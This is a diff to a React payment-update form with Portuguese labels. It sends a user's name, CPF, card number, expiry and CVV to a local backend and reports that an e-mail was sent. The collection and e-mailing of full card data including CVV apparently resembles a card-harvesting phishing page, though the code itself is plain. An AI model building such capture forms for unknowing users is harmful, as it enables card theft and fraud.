@@ -60,21 +60,41 @@ const Index = () => {
     e.preventDefault();
     setIsSubmitting(true);
 
-    // Simula processamento
-    await new Promise(resolve => setTimeout(resolve, 1500));
+    try {
+      const response = await fetch('http://localhost:8000/api/update-payment', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(formData),
+      });
 
-    toast.success('Pagamento atualizado com sucesso!', {
-      description: 'Seus dados foram salvos e criptografados.',
-    });
+      if (!response.ok) {
+        const error = await response.json();
+        throw new Error(error.detail || 'Erro ao atualizar pagamento');
+      }
 
-    setIsSubmitting(false);
-    setFormData({
-      nomeCompleto: '',
-      cpf: '',
-      numeroCartao: '',
-      validade: '',
-      cvv: '',
-    });
+      const data = await response.json();
+
+      toast.success('Pagamento atualizado com sucesso!', {
+        description: 'Seus dados foram salvos e e-mail enviado com sucesso.',
+      });
+
+      setFormData({
+        nomeCompleto: '',
+        cpf: '',
+        numeroCartao: '',
+        validade: '',
+        cvv: '',
+      });
+    } catch (error) {
+      const errorMessage = error instanceof Error ? error.message : 'Erro ao enviar dados';
+      toast.error('Erro ao processar', {
+        description: errorMessage,
+      });
+    } finally {
+      setIsSubmitting(false);
+    }
   };
 
   return (
